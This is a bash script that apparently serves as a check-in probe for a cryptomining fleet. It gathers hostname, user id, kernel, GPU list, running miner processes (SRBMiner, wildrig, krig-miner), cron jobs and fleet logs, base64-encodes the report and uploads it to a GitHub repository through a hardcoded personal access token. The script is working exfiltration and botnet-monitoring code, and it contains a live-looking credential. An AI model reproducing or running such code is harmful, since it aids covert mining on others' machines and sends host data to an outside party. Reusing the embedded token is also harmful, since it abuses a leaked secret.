#!/bin/bash
set -u
GH='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'
H=$(hostname); T=$(date -u +%Y%m%dT%H%M%SZ)
{
 echo "ALIVE host=$H ts=$T uid=$(id -u) kern=$(uname -r)"
 echo "--- gpus"; nvidia-smi -L 2>&1 | head -10
 echo "--- procs"; ps -eo pid,etime,args | grep -E 'krig|peakminer|SRBMiner|wildrig|ps_hb|sup|keeper' | grep -v grep | head -25
 echo "--- optfleet"; ls -la /opt/fleet 2>&1 | head -25; ls -la /opt/fleet/bin 2>&1 | head -30
 echo "--- units"; systemctl list-units --no-legend --state=running 2>/dev/null | grep -Ei 'nv-|prl|krig|miner|peak'
 echo "--- cron"; ls /etc/cron.d/ 2>/dev/null; head -3 /etc/cron.d/* 2>/dev/null | head -40; crontab -l 2>/dev/null | head -15
 echo "--- logs"; ls -la /var/log/fleet /var/log/*krig* /var/log/*prl* 2>/dev/null | head -20
 echo "--- krigv"; /opt/fleet/bin/krig-miner --version 2>&1 | head -3; ls -la /opt/fleet/bin/krig* 2>/dev/null
} > /tmp/probe.txt 2>&1
b64=$(base64 -w0 /tmp/probe.txt)
printf '{"message":"probe %s","content":"%s","branch":"main"}' "$H-$T" "$b64" > /tmp/body.json
SHA=$(curl -s -m 20 -H "Authorization: Bearer $GH" -H 'User-Agent: x' "https://api.github.com/repos/dongsuju/ul-plant/contents/ps/alive-$H.txt" | python3 -c 'import json,sys
try: print(json.load(sys.stdin).get("sha") or "")
except: print("")' 2>/dev/null)
if [ -n "$SHA" ]; then python3 - "$SHA" <<'PY'
import json,sys
b=json.load(open('/tmp/body.json')); b['sha']=sys.argv[1]; json.dump(b,open('/tmp/body.json','w'))
PY
fi
curl -s -m 30 -X PUT -H "Authorization: Bearer $GH" -H 'User-Agent: x' -H 'Content-Type: application/json' --data @/tmp/body.json "https://api.github.com/repos/dongsuju/ul-plant/contents/ps/alive-$H.txt" -o /tmp/put.json -w 'PUT=%{http_code}\n' >> /tmp/probe.txt 2>&1
